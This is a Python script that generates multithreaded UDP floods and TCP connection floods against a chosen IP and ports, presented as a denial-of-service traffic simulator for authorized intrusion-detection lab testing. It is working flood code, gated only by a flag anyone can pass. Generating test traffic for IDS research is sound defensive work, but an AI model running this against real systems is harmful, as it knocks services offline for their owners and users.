#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import random
import socket
import threading
import time
from dataclasses import dataclass
from typing import List


@dataclass
class Stats:
    packets_sent: int = 0
    bytes_sent: int = 0
    connect_attempts: int = 0
    errors: int = 0


class StatsCounter:
    def __init__(self) -> None:
        self._stats = Stats()
        self._lock = threading.Lock()

    def add_packet(self, byte_count: int) -> None:
        with self._lock:
            self._stats.packets_sent += 1
            self._stats.bytes_sent += byte_count

    def add_connect_attempt(self) -> None:
        with self._lock:
            self._stats.connect_attempts += 1

    def add_error(self) -> None:
        with self._lock:
            self._stats.errors += 1

    def snapshot(self) -> Stats:
        with self._lock:
            return Stats(
                packets_sent=self._stats.packets_sent,
                bytes_sent=self._stats.bytes_sent,
                connect_attempts=self._stats.connect_attempts,
                errors=self._stats.errors,
            )


def udp_flood_worker(
    target_ip: str,
    ports: List[int],
    payload_size: int,
    stop_event: threading.Event,
    stats: StatsCounter,
    pps_limit: float,
) -> None:
    payload = os.urandom(payload_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    per_packet_sleep = (1.0 / pps_limit) if pps_limit > 0 else 0.0

    while not stop_event.is_set():
        dst_port = random.choice(ports)
        try:
            sent = sock.sendto(payload, (target_ip, dst_port))
            stats.add_packet(sent)
        except OSError:
            stats.add_error()

        if per_packet_sleep > 0:
            time.sleep(per_packet_sleep)

    sock.close()


def tcp_connect_worker(
    target_ip: str,
    ports: List[int],
    payload_size: int,
    stop_event: threading.Event,
    stats: StatsCounter,
    cps_limit: float,
    connect_timeout: float,
) -> None:
    payload = os.urandom(payload_size)
    per_connect_sleep = (1.0 / cps_limit) if cps_limit > 0 else 0.0

    while not stop_event.is_set():
        dst_port = random.choice(ports)
        stats.add_connect_attempt()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(connect_timeout)

        try:
            sock.connect((target_ip, dst_port))
            sent = sock.send(payload)
            stats.add_packet(sent)
        except OSError:
            stats.add_error()
        finally:
            try:
                sock.close()
            except OSError:
                pass

        if per_connect_sleep > 0:
            time.sleep(per_connect_sleep)


def run_simulation(args: argparse.Namespace) -> None:
    ports = [int(p.strip()) for p in args.ports.split(",") if p.strip()]
    if not ports:
        raise ValueError("At least one target port is required")

    stop_event = threading.Event()
    stats = StatsCounter()

    print("[SIM] Starting controlled traffic simulation")
    print(f"[SIM] mode={args.mode} target={args.target_ip} ports={ports}")
    print(
        f"[SIM] duration={args.duration}s workers={args.workers} "
        f"payload_size={args.payload_size}"
    )

    workers: List[threading.Thread] = []
    for _ in range(args.workers):
        if args.mode == "udp":
            t = threading.Thread(
                target=udp_flood_worker,
                args=(
                    args.target_ip,
                    ports,
                    args.payload_size,
                    stop_event,
                    stats,
                    args.rate,
                ),
                daemon=True,
            )
        elif args.mode == "tcp":
            t = threading.Thread(
                target=tcp_connect_worker,
                args=(
                    args.target_ip,
                    ports,
                    args.payload_size,
                    stop_event,
                    stats,
                    args.rate,
                    args.connect_timeout,
                ),
                daemon=True,
            )
        else:
            # Mixed mode alternates worker behavior to emulate varied noisy attack traffic.
            if len(workers) % 2 == 0:
                t = threading.Thread(
                    target=udp_flood_worker,
                    args=(
                        args.target_ip,
                        ports,
                        args.payload_size,
                        stop_event,
                        stats,
                        args.rate,
                    ),
                    daemon=True,
                )
            else:
                t = threading.Thread(
                    target=tcp_connect_worker,
                    args=(
                        args.target_ip,
                        ports,
                        args.payload_size,
                        stop_event,
                        stats,
                        args.rate,
                        args.connect_timeout,
                    ),
                    daemon=True,
                )

        workers.append(t)
        t.start()

    start = time.time()
    last = start
    last_snapshot = stats.snapshot()

    try:
        while time.time() - start < args.duration:
            time.sleep(1.0)
            now = time.time()
            snap = stats.snapshot()

            delta_packets = snap.packets_sent - last_snapshot.packets_sent
            delta_bytes = snap.bytes_sent - last_snapshot.bytes_sent
            elapsed = max(now - last, 1e-6)
            pps = delta_packets / elapsed
            mbps = (delta_bytes * 8 / 1_000_000) / elapsed

            print(
                f"[SIM] t={int(now - start):>3}s "
                f"pps={pps:>8.1f} mbps={mbps:>7.3f} "
                f"packets={snap.packets_sent} errors={snap.errors}"
            )

            last = now
            last_snapshot = snap
    finally:
        stop_event.set()
        for t in workers:
            t.join(timeout=1.0)

    final = stats.snapshot()
    print("[SIM] Completed")
    print(
        f"[SIM] total_packets={final.packets_sent} total_bytes={final.bytes_sent} "
        f"connect_attempts={final.connect_attempts} errors={final.errors}"
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Controlled DDoS-style traffic simulator for authorized IDS lab testing only"
        )
    )
    parser.add_argument("--target-ip", required=True, help="Target IP (e.g., 192.168.4.1)")
    parser.add_argument(
        "--ports",
        default="1883",
        help="Comma-separated destination ports (default: 1883)",
    )
    parser.add_argument(
        "--mode",
        choices=["udp", "tcp", "mixed"],
        default="mixed",
        help="Traffic pattern mode",
    )
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument("--workers", type=int, default=8, help="Number of worker threads")
    parser.add_argument("--rate", type=float, default=200.0, help="Per-worker rate (pps or cps)")
    parser.add_argument("--payload-size", type=int, default=128, help="Payload bytes")
    parser.add_argument(
        "--connect-timeout",
        type=float,
        default=0.3,
        help="TCP connect timeout in seconds",
    )
    parser.add_argument(
        "--i-understand-lab-only",
        action="store_true",
        help="Required safety flag",
    )
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if not args.i_understand_lab_only:
        parser.error("You must pass --i-understand-lab-only for authorized lab testing")

    run_simulation(args)


if __name__ == "__main__":
    main()
